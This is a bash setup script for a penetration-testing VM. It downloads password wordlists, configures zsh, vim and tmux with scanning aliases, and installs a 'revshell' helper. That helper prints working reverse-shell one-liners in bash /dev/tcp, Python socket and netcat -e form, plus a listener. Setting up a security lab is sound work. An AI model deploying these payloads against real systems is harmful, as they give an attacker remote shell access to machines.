#!/bin/bash
set -e

DEFAULT_USER=${1:-"vagrant"}

echo "=== Starting User Configuration (running as $(whoami)) ==="

# Create useful directories
echo "=== Setting up Directory Structure ==="
mkdir -p /opt/tools
mkdir -p /opt/wordlists
mkdir -p /home/"$DEFAULT_USER"
chown -R "$DEFAULT_USER":"$DEFAULT_USER" /home/"$DEFAULT_USER"

# Download common wordlists
echo "=== Setting up Wordlists ==="
if [ ! -f "/opt/wordlists/rockyou.txt" ]; then
    wget -q "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" -O /opt/wordlists/rockyou.txt
fi

if [ ! -d "/opt/wordlists/SecLists" ]; then
    git clone https://github.com/danielmiessler/SecLists.git /opt/wordlists/SecLists
fi
chown -R "$DEFAULT_USER":"$DEFAULT_USER" /opt/wordlists

# Install Oh My Zsh for user
echo "=== Installing Oh My Zsh ==="
if [ ! -d "$HOME/.oh-my-zsh" ]; then
    sh -c "$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended
    
    # Install popular plugins
    git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions
    git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting
    
    # Configure .zshrc
    sed -i 's/plugins=(git)/plugins=(git zsh-autosuggestions zsh-syntax-highlighting docker docker-compose golang npm python pip)/' ~/.zshrc
    
    # Add custom aliases
    cat >> ~/.zshrc << 'EOF'

# Custom aliases for security testing
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'
alias ..='cd ..'
alias ...='cd ../..'
alias grep='grep --color=auto'
alias fgrep='fgrep --color=auto'
alias egrep='egrep --color=auto'

# Security tool aliases
alias nmap-quick='nmap -T4 -F'
alias nmap-full='nmap -T4 -A -v'
alias gobuster-dir='gobuster dir -w /opt/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt'
alias http-server='python3 -m http.server'

# Network aliases
alias myip='curl -s ifconfig.me'
alias ports='netstat -tulanp'

# Directory shortcuts
alias tools='cd /opt/tools'
alias wordlists='cd /opt/wordlists'
alias projects='cd ~/projects'
alias shared='cd ~/shared'

EOF
fi

# Configure Git for user
echo "=== Configuring Git for User ==="
git config --global init.defaultBranch main
git config --global pull.rebase false

# Create useful directories
echo "=== Setting up User Directories ==="
mkdir -p ~/Desktop
mkdir -p ~/Documents
mkdir -p ~/Downloads

# Configure Vim
echo "=== Configuring Vim ==="
cat > ~/.vimrc << 'EOF'
set number
set relativenumber
set autoindent
set tabstop=4
set shiftwidth=4
set smarttab
set softtabstop=4
set mouse=a
set hlsearch
set incsearch
syntax on
colorscheme desert

" Enable filetype plugins
filetype plugin indent on

" Show matching brackets
set showmatch

" No annoying sound on errors
set noerrorbells
set novisualbell
EOF

# Configure tmux
echo "=== Configuring tmux ==="
cat > ~/.tmux.conf << 'EOF'
# Set prefix to Ctrl-a
set -g prefix C-a
unbind C-b
bind C-a send-prefix

# Enable mouse mode
set -g mouse on

# Split panes using | and -
bind | split-window -h
bind - split-window -v
unbind '"'
unbind %

# Reload config file
bind r source-file ~/.tmux.conf \; display-message "Config reloaded!"

# Switch panes using Alt-arrow without prefix
bind -n M-Left select-pane -L
bind -n M-Right select-pane -R
bind -n M-Up select-pane -U
bind -n M-Down select-pane -D

# Status bar
set -g status-bg black
set -g status-fg white
set -g status-left '#[fg=green]#H'
set -g status-right '#[fg=yellow]%Y-%m-%d %H:%M'
EOF

# Set up desktop shortcuts if GUI is available
if [ -n "$DISPLAY" ] || pgrep -x "Xvfb" > /dev/null 2>&1; then
    echo "=== Setting up Desktop Environment ==="
    
    # Create desktop shortcuts
    mkdir -p ~/Desktop
    
    # Burp Suite shortcut
    cat > ~/Desktop/burpsuite.desktop << 'EOF'
[Desktop Entry]
Name=Burp Suite
Comment=Web Security Testing
Exec=burpsuite
Icon=burpsuite
Terminal=false
Type=Application
Categories=Network;Security;
EOF
    
    # Terminal shortcut
    cat > ~/Desktop/terminal.desktop << 'EOF'
[Desktop Entry]
Name=Terminal
Comment=Terminal Emulator
Exec=gnome-terminal
Icon=utilities-terminal
Terminal=false
Type=Application
Categories=System;TerminalEmulator;
EOF
    
    # Make desktop files executable
    chmod +x ~/Desktop/*.desktop
fi

# Create useful scripts
echo "=== Creating Utility Scripts ==="
mkdir -p ~/bin

# Quick HTTP server script
cat > ~/bin/serve << 'EOF'
#!/bin/bash
PORT=${1:-8000}
echo "Starting HTTP server on port $PORT"
echo "Access at: http://localhost:$PORT"
python3 -m http.server $PORT
EOF
chmod +x ~/bin/serve

# Quick reverse shell generator
cat > ~/bin/revshell << 'EOF'
#!/bin/bash
IP=${1:-10.0.2.2}
PORT=${2:-4444}

echo "Reverse shell payloads for $IP:$PORT"
echo "=================================="
echo "Bash:"
echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
echo ""
echo "Python:"
echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
echo ""
echo "NC (netcat):"
echo "nc -e /bin/sh $IP $PORT"
echo ""
echo "Listener command:"
echo "nc -lvp $PORT"
EOF
chmod +x ~/bin/revshell

# Add ~/bin to PATH
echo "export PATH=$PATH:~/bin" >> ~/.zshrc
echo "export PATH=$PATH:~/bin" >> ~/.bashrc

echo "=== User Configuration Complete ==="
